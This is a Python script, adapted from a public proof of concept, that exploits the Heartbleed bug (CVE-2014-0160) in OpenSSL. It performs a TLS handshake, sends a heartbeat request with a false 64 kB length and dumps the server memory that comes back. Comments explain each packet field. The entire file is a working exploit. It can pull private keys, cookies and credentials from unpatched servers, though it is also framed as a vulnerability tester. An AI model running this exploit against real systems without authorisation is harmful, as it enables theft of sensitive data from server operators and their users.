#!/usr/bin/env python
# SRC: (converted to python3 and some minimal changes) https://stackabuse.com/how-to-exploit-the-heartbleed-bug/

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

import sys
import struct
import socket
from optparse import OptionParser
import subprocess

# ClientHello
helloPacket = bytes.fromhex((
                                '16 03 02 00 31'  # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
                                '01 00 00 2d'  # Message type = 01 (client hello); Length = 00 00 2d

                                '03 02'  # Client version = 03 02 (TLS 1.1)

                                # Random (uint32 time followed by 28 random bytes):
                                '50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96'
                                '00'  # Session id = 00
                                '00 04 '  # Cipher suite length
                                '00 33 c0 11'  # 4 cipher suites
                                '01'  # Compression methods length
                                '00'  # Compression method 0: no compression = 0
                                '00 00'  # Extensions length = 0
                            ).replace(' ', ''))

# This is the packet that triggers the memory over-read.
# The heartbeat protocol works by returning to the client the same data that was sent;
# that is, if we send "abcd" the server will return "abcd".

# The flaw is triggered when we tell the server that we are sending a message that is X bytes long
# (64 kB in this case), but we send a shorter message; OpenSSL won't check if we really sent the X bytes of data.

# The server will store our message, then read the X bytes of data from its memory
# (it reads the memory region where our message is supposedly stored) and send that read message back.

# Because we didn't send any message at all
# (we just told that we sent FF FF bytes, but no message was sent after that)
# when OpenSSL receives our message, it wont overwrite any of OpenSSL's memory.
# Because of that, the received message will contain X bytes of actual OpenSSL memory.


heartbleedPacket = bytes.fromhex((
                                     '18 03 02 00 03'  # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
                                     '01 FF FF'  # Heartbeat message type = 01 (request); Payload length = FF FF
                                     # Missing a message that is supposed to be FF FF bytes long
                                 ).replace(' ', ''))

options = OptionParser(usage='%prog server [options]',
                       description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')


def dump(s):
    proc = subprocess.Popen('LC_CTYPE=C strings',
                            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            shell=True)
    (stdout, stderr) = proc.communicate(input=s)
    print(stdout.decode())


# When you request the 64 kB of data, the server won't tell you that it will send you 4 packets.
# But you expect that because TLS packets are sliced if they are bigger than 16 kB.
# Sometimes, (for some misterious reason) the server wont send you the 4 packets;
# in that case, this function will return the data that DO has arrived.

def receiveTLSMessage(s: socket.socket, fragments=1):
    contentType = None
    version = None
    payload = b''

    # The server may send less fragments. Because of that, this will return partial data.
    for fragmentIndex in range(0, fragments):
        tlsHeader = s.recv(5)  # Receive 5 byte header (Content type, version, and length)

        contentType, version, length = struct.unpack('>BHH', tlsHeader)  # Unpack the header
        payload_tmp = s.recv(length)  # Receive the data that the server told us it'd send

        print('Received message: type = %d, ver = %04x, length = %d' % (contentType, version, len(payload_tmp)))
        print(f'payload: {payload_tmp}')

        payload = payload + payload_tmp

    return contentType, version, payload


def exploit(s: socket.socket):
    s.send(heartbleedPacket)

    # We asked for 64 kB, so we should get 4 packets
    contentType, version, payload = receiveTLSMessage(s, 4)

    if contentType == 24:
        print('Received heartbeat response:')
        dump(payload)
        return True

    if contentType == 21:
        raise RuntimeError('Received alert: Server returned error, likely not vulnerable')

    assert False


def init_exploit(opts, args):
    print('Connecting...')
    s = socket.create_connection((args[0], opts.port), timeout=5)
    print('Sending Client Hello...')
    s.send(helloPacket)
    print('Waiting for Server Hello...')
    # Receive packets until we get a hello done packet
    while True:
        contentType, version, payload = receiveTLSMessage(s)
        # Look for server hello done message.
        if contentType == 22 and payload[0] == 0x0E:
            print('Received Server Hello!')
            break
    return s


def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    s = init_exploit(opts, args)
    print('Sending heartbeat request...')
    exploit(s)


if __name__ == '__main__':
    main()
